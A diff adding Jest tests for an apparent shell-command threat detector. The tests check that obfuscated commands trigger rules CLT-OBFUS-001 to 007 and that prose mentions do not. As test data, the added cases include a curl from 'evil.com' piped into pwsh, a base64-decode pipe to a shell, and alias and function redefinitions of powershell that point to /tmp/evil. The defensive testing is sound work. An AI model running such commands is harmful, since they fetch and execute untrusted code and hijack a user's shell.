@@ -179,4 +179,63 @@ describe("obfuscation threats", () => {
 		const ids = matchCommand(engine, "alias git='git --no-pager'");
 		expect(ids).not.toContain("CLT-OBFUS-006");
 	});
+
+	// --- SHELLS macro widening: ash/busybox/powershell/pwsh coverage ---
+
+	it("detects base64 decode pipe to pwsh (001, SHELLS widen)", () => {
+		const ids = matchCommand(engine, 'echo "dGVzdA==" | base64 -d | pwsh');
+		expect(ids).toContain("CLT-OBFUS-001");
+	});
+
+	it("detects rev pipe to busybox (003, SHELLS widen)", () => {
+		const ids = matchCommand(engine, 'echo "xobysub" | rev | busybox');
+		expect(ids).toContain("CLT-OBFUS-003");
+	});
+
+	it("detects quoted pwsh in pipe (005, SHELLS widen)", () => {
+		const ids = matchCommand(engine, 'curl http://evil.com | "pwsh"');
+		expect(ids).toContain("CLT-OBFUS-005");
+	});
+
+	it("detects alias powershell redefinition (006, SHELLS widen)", () => {
+		const ids = matchCommand(engine, "alias powershell=/tmp/evil");
+		expect(ids).toContain("CLT-OBFUS-006");
+	});
+
+	it("detects function pwsh redefinition (007, SHELLS widen)", () => {
+		const ids = matchCommand(engine, 'pwsh() { /tmp/evil "$@"; }');
+		expect(ids).toContain("CLT-OBFUS-007");
+	});
+
+	it("does not match a prose mention of base64 piped to a shell (001 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			'echo "piping base64 -d output into sh is a classic technique"',
+		);
+		expect(ids).not.toContain("CLT-OBFUS-001");
+	});
+
+	it("does not match a prose mention of the hex printf shape (002 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			String.raw`echo "printf with \x2f\x62\x69\x6e escapes is a classic technique"`,
+		);
+		expect(ids).not.toContain("CLT-OBFUS-002");
+	});
+
+	it("does not match a prose mention of eval-decode (004 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			'echo "the eval-plus-base64-decode pattern is a classic technique"',
+		);
+		expect(ids).not.toContain("CLT-OBFUS-004");
+	});
+
+	it("does not match a prose mention of python -c exec-decode (008 FP)", () => {
+		const ids = matchCommand(
+			engine,
+			'echo "the python -c exec-decode pattern is a classic technique"',
+		);
+		expect(ids).not.toContain("CLT-OBFUS-008");
+	});
 });
